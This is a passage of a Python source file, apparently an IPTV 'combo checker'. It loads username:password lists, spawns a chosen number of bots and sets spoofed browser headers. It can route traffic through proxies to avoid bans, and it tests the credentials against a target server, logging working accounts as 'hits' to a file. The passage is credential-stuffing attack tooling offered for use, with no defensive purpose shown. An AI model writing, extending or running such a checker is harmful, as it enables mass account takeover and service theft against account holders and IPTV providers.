            print(f"{cor.vermelho}\n  {t("responses.invalid_type_proxy")}{cor.reset}")
            return

    # Perguntar o número de bots
    try:
        banner(config, t)
        print(f'\n  {cor.ciano}{"=" * 26}{cor.reset}')
        print(f"{cor.atention}  {t("questions.number_of_bots")}{cor.reset}")
        print(f'  {cor.ciano}{"=" * 26}{cor.reset}')
        num_bots = int(input(f"{cor.verde}\n  {t("responses.response")} >>> {cor.reset}"))
        if num_bots < 1:
            print(f"{cor.vermelho}{t("responses.invalid_number_of_bots")}{cor.reset}")
            return
    except ValueError:
        print(f"{cor.vermelho}{t("responses.invalid_input_number")}{cor.reset}")
        return

    # Ler combos (usuário:senha)
    combos = []
    linhas_invalidas = 0
    with open(arquivo_combo, 'r', encoding='utf-8') as f:
        for linha in f.readlines():
            linha = linha.strip()
            if ":" in linha and len(linha.split(":")) == 2:  # Verifica se a linha está no formato correto
                username, password = linha.split(":", 1)  # Divide apenas no primeiro ":"
                combos.append((username, password))
            else:
                linhas_invalidas += 1

    if linhas_invalidas > 0:
        print(f"{cor.amarelo}{t("responses.removing_invalid_lines").format(linhas_invalidas=linhas_invalidas)}{cor.reset}")

    if not combos:
        print(f"{cor.vermelho}{t("responses.no_valid_combo_found")}{cor.reset}")
        return

    # Configurar headers personalizados
    headers = {
        "Host": server,
        "Referer": f"http://{server}/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache"
    }

    # Formatar nome do arquivo de resultados
    nome_arquivo = f"ChK IPTV [ {server.replace(':', '_')} ].txt"
    caminho_arquivo = os.path.join(pasta_hits, nome_arquivo)

    # Contadores de hits, bads e bans
    hits = 0
    bads = 0
    bans = 0
    total_linhas = len(combos)

    # Processar combos com múltiplos bots
    hits, bads, bans = processar_combos(
    combos, server, headers, proxies, tipo_proxy, num_bots, hits, bads, bans, total_linhas, caminho_arquivo, usar_proxy,
    arquivo_proxy if usar_proxy == "1" else None, config, t)

    # Exibir resumo final simplificado
    print(f"\n{cor.magenta}{t("menu.exit_message_1")}{cor.reset}")

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"\n{cor.vermelho}  CRITICAL ERROR: {e}{cor.reset}")
        traceback.print_exc()
        input("Pressione Enter para sair...")